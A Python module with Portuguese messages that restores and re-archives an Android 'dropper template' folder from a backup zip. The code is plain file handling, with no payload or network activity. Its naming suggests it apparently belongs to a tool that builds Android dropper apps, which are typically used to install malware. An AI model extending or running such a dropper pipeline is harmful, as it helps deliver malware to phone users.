
from __future__ import annotations

import os
import shutil
import zipfile

from config import Config
from services.zip_safe import safe_zip_extract

_TEMPLATE_MARKER = "AndroidManifest.xml"

def dropper_template_backup_zip() -> str:
    return Config.DROPPER_TEMPLATE_BACKUP_ZIP

def dropper_template_ready() -> bool:
    return os.path.isfile(os.path.join(Config.DROPPER_TEMPLATE, _TEMPLATE_MARKER))

def ensure_dropper_template_ready() -> str:
    template_dir = Config.DROPPER_TEMPLATE
    os.makedirs(template_dir, exist_ok=True)
    if dropper_template_ready():
        return template_dir

    zip_path = dropper_template_backup_zip()
    if not os.path.isfile(zip_path):
        raise RuntimeError(
            f"Template dropper ausente: extraia {zip_path} ou restaure a pasta."
        )

    safe_zip_extract(zip_path, template_dir)
    if not dropper_template_ready():
        raise RuntimeError("Falha ao extrair template dropper do backup zip.")
    return template_dir

def archive_dropper_template(*, keep_extracted: bool = False) -> str:
    template_dir = Config.DROPPER_TEMPLATE
    if not os.path.isdir(template_dir):
        raise RuntimeError(f"Pasta template ausente: {template_dir}")
    if not dropper_template_ready():
        raise RuntimeError("dropper_rebuild sem AndroidManifest.xml — nada para arquivar.")

    zip_path = dropper_template_backup_zip()
    temp_zip = f"{zip_path}.tmp"
    if os.path.isfile(temp_zip):
        os.remove(temp_zip)

    with zipfile.ZipFile(temp_zip, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for root, _dirs, files in os.walk(template_dir):
            for name in files:
                full_path = os.path.join(root, name)
                arcname = os.path.relpath(full_path, template_dir)
                zf.write(full_path, arcname)

    if os.path.isfile(zip_path):
        os.remove(zip_path)
    os.replace(temp_zip, zip_path)

    if not keep_extracted:
        for root, dirs, files in os.walk(template_dir, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                shutil.rmtree(os.path.join(root, name), ignore_errors=True)

    return zip_path
